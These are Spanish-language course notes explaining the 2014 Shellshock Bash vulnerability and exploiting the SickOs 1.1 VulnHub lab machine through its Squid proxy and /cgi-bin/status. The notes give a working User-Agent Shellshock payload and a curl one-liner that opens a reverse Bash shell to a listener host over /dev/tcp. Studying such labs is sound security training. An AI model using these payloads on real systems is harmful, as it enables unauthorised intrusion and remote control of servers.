## Datos de la clase: 
Un ataque **Shellshock** es un tipo de ataque informático que aprovecha una vulnerabilidad en el **intérprete de comandos Bash** en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del **User-Agent**, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

A continuación se proporciona el enlace directo para la descarga de la máquina ‘**SickOs 1.1**‘. Esta máquina corresponde a la misma que estuvimos enumerando en la clase anterior, solo que en este caso procederemos con la fase de explotación haciendo uso de esta técnica:

- **SickOs 1.1**: [https://www.vulnhub.com/entry/sickos-11,132/](https://www.vulnhub.com/entry/sickos-11,132/)
----
## Mis apuntes: 

Seguiremos con la misma maquina de la clase de enumeración y vulneración de Squid Proxy. 
podemos enumerar las carpetas con gobuster pasando por el proxy como lo vimos la ves anterior pero esta vez le vamos a añadir el parámetro --add-slash, por lo que obtendriamos lo siguiente como respuesta: 
![[Pasted image 20240527144709.png]]
al ver la carpeta /cgi-bin/, se puede saber que puede estar bajo el riesgo de un ataque shell shock esto va a depender únicamente de la version de la shell que se tenga. 
![[Pasted image 20240527154806.png]]
como vemos encontramos un status dentro de esta carpeta cgi-bin, por lo que si nos metemos a la pagina pasando por el proxy podemos ver lo siguiente: 
![[Pasted image 20240527154928.png]]
ahora si buscamos como hacer un ataque shellshock podemos encontrar lo siguiente en internet: 
https://blog.cloudflare.com/inside-shellshock
en el cual podemos ver el siguiente ejemplo: 
```nginx
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```
en la parte en donde sale el /bin/eject es el programa que se desea ejecutar en el servidor, hay casos en los que este no funciona pero hay que intentando agregarle un echo;  entre el los términos de ejecución.
![[Pasted image 20240528012415.png]]
como puedo ganar acceso a la maquina. 
podemos ocupar el oneliner que ocuparemos casi siempre para ganar acceso desde algun comando. 
```nginx
curl http://192.168.1.86/cgi-bin/status --proxy http://192.168.1.86:3128 -H "User-Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/92.168.1.88/443 0>&1'"
```
y tenemos que ponernos en escucha en nuestra maquina para poder tener acceso a la maquina desde nuestra consola: 
![[Pasted image 20240528013330.png]]
y en la parte que estamos de escucha nos sale lo siguiente: 
![[Pasted image 20240528013431.png]]
se puede hacer un script en python para hacer un shell shock de forma automatica: 
![[Pasted image 20240528150214.png]]
y esta otorga una consola interactiva: 
![[Pasted image 20240528150300.png]]
